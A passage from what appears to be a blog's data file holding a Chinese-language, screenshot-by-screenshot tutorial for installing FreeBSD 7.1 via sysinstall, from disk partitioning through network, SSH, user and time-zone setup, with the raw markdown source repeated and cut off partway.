src=\"/images/pic/other_site/wiki_freebsdchina_5-fdisk_partition_editor.jpg\" /></a></p><p>这里,我们选择[A],键盘上按一下a键,表示使用全部硬盘空间,做完所有操作后,要退出此界面,只需按一下q键,就退出,并进入下一步</p><p>如果你想了解更多的此界面包含的信息，请点击这里<a href=\"http://wiki.freebsdchina.org/howto/i/install/f/fdisk_partition_editor\" title=\"howto:i:install:f:fdisk_partition_editor\" rel=\"nofollow\">fdisk_partition_editor</a></p><a name=\"第七步_启动模式\">第七步：启动模式</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/6-install_boot_manager_for_drive_ad0.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:6-install_boot_manager_for_drive_ad0.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_6-install_boot_manager_for_drive_ad0.jpg\" /></a></p><p>选择[Standard]，直接使用MBR启动 <br />BootMgr,使用FreeBSD的启动管理，如果你要安装其它操作系统，使用此项 <br />Standard 直接使用MBR模式，不使用启动管理器，如果你一个硬盘只使用FreeBSD一个操作系统的话，使用此项</p><a name=\"第八步提示信息\">第八步:提示信息</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/7-message.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:7-message.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_7-message.jpg\" /></a></p><p>翻译如下:xxxxx…..English Good的过来帮忙翻译一下 <img src=\"/images/pic/other_site/wiki_freebsdchina_icon_cool.gif\" alt=\"8-)\" /></p><a name=\"第九步_分区标签_这里不知道怎么翻译_硬盘标签\">第九步：分 区标签？？（这里不知道怎么翻译，硬盘标签？？）</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/8-freebsd_disklabel_editor.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:8-freebsd_disklabel_editor.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_8-freebsd_disklabel_editor.jpg\" /></a></p><p>OK，我们现在要对使用的硬盘空间进行….不知道怎么说了，分区吧，就当成分区吧 -_-!</p><p>当我们选定(利用上下移动键) [Disk: ad0 Partition name:ad0s1 Free: XXX blocks (xxx <acronym title=\"Megabyte\">MB</acronym>)]之后，可以使用a键进行自动配置，如果全部操作完成，需要退出此界面，进入下一步，按 q键，退出</p><p>如果你想了解更多的此界面包含的信息，请点击这里<a href=\"http://wiki.freebsdchina.org/howto/i/install/d/disklabel_editor\" title=\"howto:i:install:d:disklabel_editor\" rel=\"nofollow\">disklabel_editor</a></p><a name=\"第十步choose_distributions_谁为帮忙翻译一下吧\">第十步:Choose Distributions  (谁为帮忙翻译一下吧)</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/9-choose_distributions.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:9-choose_distributions.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_9-choose_distributions.jpg\" /></a></p><p>我们这里选择[Minmal]进行最小化安装.</p><p>如果你想了解更多的此界面包含的信息，请点击这里<a href=\"http://wiki.freebsdchina.org/howto/i/install/c/choose_distributions\" title=\"howto:i:install:c:choose_distributions\" rel=\"nofollow\">choose_distributions</a></p><a name=\"第十一步_选择从哪里安装\">第十一步：选择从哪里安装</a><p><a href=\"http://wiki.freebsdchina.org/_\ndetail/howto/i/10-choose_installation_media.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:10-choose_installation_media.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_10-choose_installation_media.jpg\" /></a></p><p>1. CD/DVD 从CD/DVD上安装<br />2. <acronym title=\"File Transfer Protocol\">FTP</acronym>  从FTP服务器进行安装,如果你的网速够快的话，可以从官方Ftp网站进行网络安装<br />3. <acronym title=\"File Transfer Protocol\">FTP</acronym>  透过防火墙从FTP服务器进行安装<br />4. <acronym title=\"Hyper Text Transfer Protocol\">HTTP</acronym>  通过http代理服务器从FTP服务器进行安装,这里还是从FTP服务器安装，只是使用了HTTP代理<br />5. DOS 从一个DOS分区进行安装<br />6. NFS 通过 NFS进行安装？？<br />7. File System 偶也不是很明白<br />8. Floppy 从软盘进行安装。<br />9. Tape 从磁带机上进行安装</p><p>我们当然是选择 [CD/DVD] 了</p><a name=\"第十二步警告提示信息\">第十二步:警告提示信息</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/11-user_confirmation_requested.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:11-user_confirmation_requested.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_11-user_confirmation_requested.jpg\" /></a></p><p>选择[YES]<br />以上内容翻译如下:……..</p><a name=\"第十三步提示信息\">第十三步:提示信息</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/12-message.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:12-message.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_12-message.jpg\" /></a></p><p>以上内容翻译如下:……..</p><a name=\"第十四步网络配置\">第十四步:网络配置</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/13-user_confirmation_requested-configure_ethernet.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:13-user_confirmation_requested-configure_ethernet.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_13-user_confirmation_requested-configure_ethernet.jpg\" /></a></p><p>选择[YES]，我们进行网络配置</p><a name=\"第十五步选择网络接口\">第十五步:选择网络接口</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/14-network_interface_information_required.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:14-network_interface_information_required.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_14-network_interface_information_required.jpg\" /></a></p><p>em0 是我的网卡，你的网卡可能是其它，如果被FreeBSD识别出来的话，第一项就是配置网卡<br />plip0 <br />sl0 <br />ppp0 <br />sl0 <br />ppp0</p><p>我们进行网卡设置。选择[em0],注意，你的可能是其它值</p><a name=\"第十六步是否使用ipv6\">第十六步:是否使用IPv6</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/15-user_confirmation_requested-ipv6.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:15-user_confirmation_requested-ipv6.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_15-user_confirmation_requested-ipv6.jpg\" /></a></p><p>选择[NO],我也很想用哪,可现在的网络不支持哪</p><a name=\"第十七步_是否使用_dhcp_来获得网络配置\">第十七步：是否 使用 DHCP 来获得网络配置</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/16-user_confirmation_requested-dhcp.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:16-user_confirmation_requested-dhcp.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_16-user_confirmation_requested-dhcp.jpg\" /></a></p><p>选择[NO]  (因为我的网络没有DHCP服务器)</p><a name=\"第十八步_网卡配置\">第十八步：网卡配置</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/17-network_configuration.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:17-network_configuration.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_17-network_configuration.jpg\" /></a></p><p>Host:你的这台主机的名称，你可以填你想要的名称<br />Domain:这里填写你的域名（如果你没有域名的话，我也不知道填什么，知道的兄弟请告诉一下）<br />IPv4 Gateway:网关IP<br />Name Server:名称服务器（你的DNS服务器）<br />IPv4 Address：此机的IP地址，这个你自已设定了<br />NetMask: 子网掩码，这个要问一下你的网络管理员，如果是254台机器的常见的局域网的话，就是255.255.255.0<br />Extra options to ifconfig: 偶也不知道这里填什么，反正空着就是了</p><a name=\"第十九步是否现在启用网络接口\">第十九步:是否现在启用网络接口</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/18-user_confirmation_requested-bring_interface.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:18-user_confirmation_requested-bring_interface.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_18-user_confirmation_requested-bring_interface.png\" /></a></p><p>选择[YES],上面的图示错了,要选[YES]</p><a name=\"第二十步是否做为网关\">第二十步:是否做为网关</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/19-user_confirmation_requested-gateway.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:19-user_confirmation_requested-gateway.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_19-user_confirmation_requested-gateway.png\" /></a></p><p>选择[NO]</p><a name=\"第二十一步是否设置inetd的配置\">第二十一步:是否设置inetd的配 置</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/20-user_confirmation_requested-configure_inetd.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:20-user_confirmation_requested-configure_inetd.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_20-user_confirmation_requested-configure_inetd.png\" /></a></p><p>选择[NO],这个是用来配置inetd的,相当于WINDOWS里控制面板里的 [服务]</p><a name=\"第二十三步是否启用ssh\">第二十三步:是否启用SSH</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/21-user_confirmation_requested-ssh.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:21-user_confirmation_requested-ssh.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_21-user_confirmation_requested-ssh.png\" /></a></p><p>选择[YES]，因为我们要用SSH来远程控制服务器（大家都是懒人，免得老是往机房里跑了,受辐射不说，还瘦上两斤肉）</p><a name=\"第二十三步是否启用_ftp_服务\">第二十三步:是否启用 FTP 服务</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/22-user_confirmation_requested-ftp.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:22-user_confirmation_requested-ftp.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_22-user_confirmation_requested-ftp.png\" /></a></p><p>选择[NO],如果你要开启FTP服务器的话,选择YES</p><a name=\"第二十四步是启做为nfs服务器\">第二十四步:是启做为NFS服务器</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/23-user_confirmation_requested-nfs_server.png?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:23-user_confirmation_requested-nfs_server.png\"><img src=\"/images/pic/other_site/wiki_freebsdchina_23-user_confirmation_requested-nfs_server.png\" /></a></p><p>选择[NO],偶们不想要它做为NFS 服务器</p><a name=\"第二十五步是否启用nfs客户端功能\">第二十五步:是否启用NFS客户端功 能</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/24-user_confirmation_requested-nfs_client.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:24-user_confirmation_requested-nfs_client.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_24-user_confirmation_requested-nfs_client.jpg\" /></a></p><p>偶们还是选择[NO]</p><a name=\"第二十六步是否定制控制台设定\">第二十六步:是否定制控制台设定????</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/25-user_confirmation_requested-console_settions.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:25-user_confirmation_requested-console_settions.\njpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_25-user_confirmation_requested-console_settions.jpg\" /></a></p><p>[NO]</p><a name=\"第二十七步是否设置时区\">第二十七步:是否设置时区</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/26-user_confirmation_requested-set_time_zone.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:26-user_confirmation_requested-set_time_zone.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_26-user_confirmation_requested-set_time_zone.jpg\" /></a></p><p>[YES],这里我们将选择我们的时区，我们是中国北京时间</p><a name=\"第二十八步_选择_本地_或_utc_时间\">第二十八步：选择 本地  或 UTC 时间</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/27-select_clock.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:27-select_clock.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_27-select_clock.jpg\" /></a></p><p>这里我们选择[NO] 注： 世界协调时间(Universal Time Coordinated,UTC) <br />GPS  系统中有两种时间区分，一为UTC，另一为LT（地方时）两者的区别为时区不同，UTC就是0时区的时间，地方时为本地时间，如北京为早上八点（东八 区），UTC时间就为零点，时间比北京时晚八小时，以此计算即可</p><a name=\"第二十九步_选择所在洲\">第二十九步：选择所在洲</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/28-time_zone_selector.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:28-time_zone_selector.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_28-time_zone_selector.jpg\" /></a></p><p>[5 Asia] 我们选择亚洲,如果你不在亚洲的话，选择你所有的地区</p><a name=\"第三十步_选择国家或地区\">第三十步：选择国家或地区</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/29-countries_in_asia.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:29-countries_in_asia.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/29-countries_in_asia.jpg\" /></a></p><p>[9 China] 这里选择的有国家,也有地区,比如Hong Kong,是China的一部分,是一个地区</p><a name=\"第三十一步选择时区\">第三十一步:选择时区</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/30-china_time_zones.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:30-china_time_zones.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/30-china_time_zones.jpg\" /></a></p><p>我们中国大陆人民用的是 [1 east China - Beijin,Guangdong,Shanghai,etc .] 北京时间</p><a name=\"第三十二步选择是否使用短写模式的时间\">第三十二步:选择是否使用短写模 式的时间???</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/31-confirmation.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:31-confirmation.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/31-confirmation.jpg\" /></a></p><p>这个按自已的需要选择,YES表示使用短写的时间模式???</p><a name=\"第三十三步是否使用linux_binary_compatibility\">第三十三步:是否使用Linux binary  compatibility</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/32-user_confirmation_requested-linux_binary_compatibility.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:32-user_confirmation_requested-linux_binary_compatibility.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/32-user_confirmation_requested-linux_binary_compatibility.jpg\" /></a></p><p>由于…..(原因太多,我们就不一一例举了),所以我们要选择[YES],不然可能有部分Linux老爹生下的软件不能正常运行的</p><a name=\"第三十四步是否有ps2_serial_bus_的鼠标\">第 三十四步:是否有PS/2,serial,bus 的鼠标？？</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/33-user_confirmation_requested-set_mouse.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:33-user_confirmation_requested-set_mouse.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/33-user_confirmation_requested-set_mouse.jpg\" /></a></p><p>[NO],偶们不用mouse了</p><a name=\"第三十五步_这个偶也不知道有啥作用_以前没有碰到过\">第 三十五步：这个偶也不知道有啥作用，以前没有碰到过</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/34-user_confirmation_requested-package.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:34-user_confirmation_requested-package.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/34-user_confirmation_requested-package.jpg\" /></a></p><p>偶是选择 [NO]，因为我也不知道是干嘛的，欢迎知道的来补充一下。</p><a name=\"第三十六步是否增加新用户\">第三十六步:是否增加新用户</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/35-user_confirmation_requested-add_user.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:35-user_confirmation_requested-add_user.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/35-user_confirmation_requested-add_user.jpg\" /></a></p><p>[YES]<br />这里我们要增加一用户，因为我们启用了SSH,而默认情况下Root帐号是不能远程登陆SSH,所以我们这里要增加个wheel组的用户,让它来进行 SSH远程登陆</p><a name=\"第三十七步用户和组管理界面\">第三十七步:用户和组管理界面</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/36-user_confirmation_requested-user_and_group_management.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:36-user_confirmation_requested-user_and_group_management.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/36-user_confirmation_requested-user_and_group_management.jpg\" /></a></p><p>[User]<br />这里我们增加个wheel组的用户</p><a name=\"第三十八步增加一用户\">第三十八步:增加一用户</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/37-user_confirmation_requested-user_and_group_management-add_user.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:37-user_confirmation_requested-user_and_group_management-add_user.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/37-user_confirmation_requested-user_and_group_management-add_user.jpg\" /></a></p><p>这里要注意,Group和Member  groups输入wheel,这个用户用来远程SSH登陆,切记切记,一定要设个密码,不然你的服务器就会变成公共场所了</p><a name=\"第三十九步退出用户管理\">第三十九步:退出用户管理</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/38-user_confirmation_requested-exit.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:38-user_confirmation_requested-exit.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/38-user_confirmation_requested-exit.jpg\" /></a></p><a name=\"第四十步提示信息\">第四十步:提示信息</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/39-message.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:39-message.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/39-message.jpg\" /></a></p><p>大意是:设置一个ROOT帐号的密码</p><a name=\"第四十一步设置root帐号的密码\">第四十一步:设置root帐号的密码</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/40-root_password.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:40-root_password.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/40-root_password.jpg\" /></a></p><p>一定要设的长一点哪,不过不要设完后自已也忘了密码 (偶就经常出这样的事故 -_-! )</p><a name=\"第四十二步不知道怎么翻译了\">第四十二步: ..... 不知道怎么翻译了</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/41-user_confirmation_requested-configuration_menu.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:41-user_confirmation_requested-configuration_menu.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/41-user_confirmation_requested-configuration_menu.jpg\" /></a></p><a name=\"第四十三步退出安装\">第四十三步:退出安装</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/42-exit_install.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:42-exit_install.jpg\"><img src=\"http://wiki.freebsdchina.org/_me\ndia/howto/i/42-exit_install.jpg\" /></a></p><p>选择[X Exit Instll]我们退出安装</p><a name=\"最后一步重启\">最后一步:重启</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/43-remve_cd.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:43-remve_cd.jpg\"><img src=\"http://wiki.freebsdchina.org/_media/howto/i/43-remve_cd.jpg\" /></a></p><p>这里要注意,一定要拿出光盘,后再选择[YES],切记切记</p><p>OK全文结束，累死我家毛驴了</p>","source":"_posts/FreeBSD-安装教程.md","raw":"title: FreeBSD 安装教程\ncategories: [Linux]\ntags: []\ndate: 2010-05-16 15:43:00\n---\n<a name=\"freebsd_安装教程\">FreeBSD 安装教程</a><p>本文以安装 FreeBSD 7.1 (i386) 为示范</p><p>转载来源：http://wiki.freebsdchina.org/howto/i/installbsd</p><p>帮助英语不好的朋友和初学FessDSB的朋友们</p><p>本人其实也是刚开始学用FreeBSD的菜鸟,由于时间空闲,所以想为FreeBSD尽点微薄之力,下文中可能有大量的错误,请老鸟们指正,免得让我误人 子弟.</p><a name=\"freebsd_的下载\">FreeBSD 的下载</a><p>大家可以到 <a href=\"http://www.freebsdchina.org/\" title=\"http://www.freebsdchina.org\" rel=\"nofollow\">http://www.freebsdchina.org</a>  的首页上选择下载,如果只是mini安装的话,只需下载 Disk1 (第一张光盘)就足够了 下载中大家可能看到有  i386和amd64两种版本，i386是32位的操作系统，amd64是64位的操作系统，amd64并不是表示只能使用在amd公司产的64位的系统 上，Intel的相关x86架构上的64位系统也可以使用。 （希望了解相关知识的老鸟们补充一下相关的知识） <a href=\"http://wiki.freebsdchina.org/howto/a/amd64_list\" title=\"howto:a:amd64_list\">支持 FreeBSD amd64 的CPU例表</a></p><a name=\"基本安装过程\">基本安装过程</a><p>OK,让我们开始FreeBSD之旅,直接敲回车,开始安装.</p><a name=\"第一步_选择启动模式\">第一步：选择启动模式</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/0-welcome_to_freebsd.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:0-welcome_to_freebsd.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_0-welcome_to_freebsd.jpg\" /></a></p><p>上图的内容为； <br />1.启动FreeBSD [默认选项] <br />2.启动FreeBSD，禁用ACPI <br />3.安全模式启动FreeBSD <br />4.单用户模式启动FreeBSD <br />5……..偶也不知道 verbose loggin是啥 <img src=\"/images/pic/other_site/wiki_freebsdchina_icon_sad.gif\" alt=\":-(\" /> <br />6.进入启动指令模式（翻译的可能有点问题）<br />7.重启</p><a name=\"第二步_选择国家\">第二步：选择国家</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/1-country_selection.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:1-country_selection.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_1-country_selection.jpg\" /></a></p><p>我们当然是选择China了，如果选择呢，只要使用上下移动键就可以上下移动(我总感觉这句像废话)。移动键在我们键盘的最右手边的一排小键盘的左边，那 四个单独在一起的键，如果你分不清左右的话，我建议你还是拿根绳子自已找棵树吧</p><p>有的朋友可能要问，我已经选好了[China]了，怎么选择 [OK] 或 [Cancel]  呢，只需要按[Tab]键就行了，就可以在两者之间切换，如果你以前不知道，多按几下就明白了，光标会移动到你要进行操作的项目上去的。OK,如果你现在 会了,并能举一反三了,那说明你的智商至少70分以上</p><a name=\"第三步选择键盘类型\">第三步:选择键盘类型</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/2-system_conole_keymap.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:2-system_conole_keymap.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_2-system_conole_keymap.jpg\" /></a></p><p>我们选择[USA <acronym title=\"International Organization for Standardization\">ISO</acronym>]  美式标准键盘</p><a name=\"第四步_进入安装菜单\">第四步：进入安装菜单</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/3-sysinatall_main_menu.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:3-sysinatall_main_menu.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_3-sysinatall_main_menu.jpg\" /></a></p><p>我们选择[Standard]进行安装，如果你想了解更多的关于sysinstall Main Menu的信息请点击<a href=\"http://wiki.freebsdchina.org/howto/i/install/s/sysinstall_main_menu\" title=\"howto:i:install:s:sysinstall_main_menu\" rel=\"nofollow\">sysinstall_main_menu</a></p><a name=\"第五步提示信息\">第五步:提示信息</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/4-message.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:4-message.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_4-message.jpg\" /></a></p><p>翻译如下:xxxxx…..English Good的过来帮忙翻译一下 <img src=\"/images/pic/other_site/wiki_freebsdchina_icon_cool.gif\" alt=\"8-)\" /></p><a name=\"第六步硬盘分区\">第六步:硬盘分区</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/5-fdisk_partition_editor.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:5-fdisk_partition_editor.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_5-fdisk_partition_editor.jpg\" /></a></p><p>这里,我们选择[A],键盘上按一下a键,表示使用全部硬盘空间,做完所有操作后,要退出此界面,只需按一下q键,就退出,并进入下一步</p><p>如果你想了解更多的此界面包含的信息，请点击这里<a href=\"http://wiki.freebsdchina.org/howto/i/install/f/fdisk_partition_editor\" title=\"howto:i:install:f:fdisk_partition_editor\" rel=\"nofollow\">fdisk_partition_editor</a></p><a name=\"第七步_启动模式\">第七步：启动模式</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/6-install_boot_manager_for_drive_ad0.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:6-install_boot_manager_for_drive_ad0.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_6-install_boot_manager_for_drive_ad0.jpg\" /></a></p><p>选择[Standard]，直接使用MBR启动 <br />BootMgr,使用FreeBSD的启动管理，如果你要安装其它操作系统，使用此项 <br />Standard 直接使用MBR模式，不使用启动管理器，如果你一个硬盘只使用FreeBSD一个操作系统的话，使用此项</p><a name=\"第八步提示信息\">第八步:提示信息</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/7-message.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:7-message.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_7-message.jpg\" /></a></p><p>翻译如下:xxxxx…..English Good的过来帮忙翻译一下 <img src=\"/images/pic/other_site/wiki_freebsdchina_icon_cool.gif\" alt=\"8-)\" /></p><a name=\"第九步_分区标签_这里不知道怎么翻译_硬盘标签\">第九步：分 区标签？？（这里不知道怎么翻译，硬盘标签？？）</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/8-freebsd_disklabel_editor.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:8-freebsd_disklabel_editor.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_8-freebsd_disklabel_editor.jpg\" /></a></p><p>OK，我们现在要对使用的硬盘空间进行….不知道怎么说了，分区吧，就当成分区吧 -_-!</p><p>当我们选定(利用上下移动键) [Disk: ad0 Partition name:ad0s1 Free: XXX blocks (xxx <acronym title=\"Megabyte\">MB</acronym>)]之后，可以使用a键进行自动配置，如果全部操作完成，需要退出此界面，进入下一步，按 q键，退出</p><p>如果你想了解更多的此界面包含的信息，请点击这里<a href=\"http://wiki.freebsdchina.org/howto/i/install/d/disklabel_editor\" title=\"howto:i:install:d:disklabel_editor\" rel=\"nofollow\">disklabel_editor</a></p><a name=\"第十步choose_distributions_谁为帮忙翻译一下吧\">第十步:Choose Distributions  (谁为帮忙翻译一下吧)</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/9-choose_distributions.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:9-choose_distributions.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_9-choose_distributions.jpg\" /></a></p><p>我们这里选择[Minmal]进行最小化安装.</p><p>如果你想了解更多的此界面包含的信息，请点击这里<a href=\"http://wiki.freebsdchina.org/howto/i/install/c/choose_distributions\" title=\"howto:i:install:c:choose_distributions\" rel=\"nofollow\">choose_distributions</a></p><a name=\"第十一步_选择从哪里安装\">第十一步：选择从哪里安装</a><p><a href=\"http://wiki.freebsdchina.org/_\ndetail/howto/i/10-choose_installation_media.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:10-choose_installation_media.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_10-choose_installation_media.jpg\" /></a></p><p>1. CD/DVD 从CD/DVD上安装<br />2. <acronym title=\"File Transfer Protocol\">FTP</acronym>  从FTP服务器进行安装,如果你的网速够快的话，可以从官方Ftp网站进行网络安装<br />3. <acronym title=\"File Transfer Protocol\">FTP</acronym>  透过防火墙从FTP服务器进行安装<br />4. <acronym title=\"Hyper Text Transfer Protocol\">HTTP</acronym>  通过http代理服务器从FTP服务器进行安装,这里还是从FTP服务器安装，只是使用了HTTP代理<br />5. DOS 从一个DOS分区进行安装<br />6. NFS 通过 NFS进行安装？？<br />7. File System 偶也不是很明白<br />8. Floppy 从软盘进行安装。<br />9. Tape 从磁带机上进行安装</p><p>我们当然是选择 [CD/DVD] 了</p><a name=\"第十二步警告提示信息\">第十二步:警告提示信息</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/11-user_confirmation_requested.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:11-user_confirmation_requested.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_11-user_confirmation_requested.jpg\" /></a></p><p>选择[YES]<br />以上内容翻译如下:……..</p><a name=\"第十三步提示信息\">第十三步:提示信息</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/12-message.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:12-message.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_12-message.jpg\" /></a></p><p>以上内容翻译如下:……..</p><a name=\"第十四步网络配置\">第十四步:网络配置</a><p><a href=\"http://wiki.freebsdchina.org/_detail/howto/i/13-user_confirmation_requested-configure_ethernet.jpg?id=howto%3Ai%3Ainstallbsd\" title=\"howto:i:13-user_confirmation_requested-configure_ethernet.jpg\"><img src=\"/images/pic/other_site/wiki_freebsdchina_13-user_confirmation_requested-configure_ethernet.jpg\" /></a></p><p>选择[YES]，我们进行网络配置</p><a name=\"第十五步选择网络接口\">第十五步:选择网络接口</a><p><a 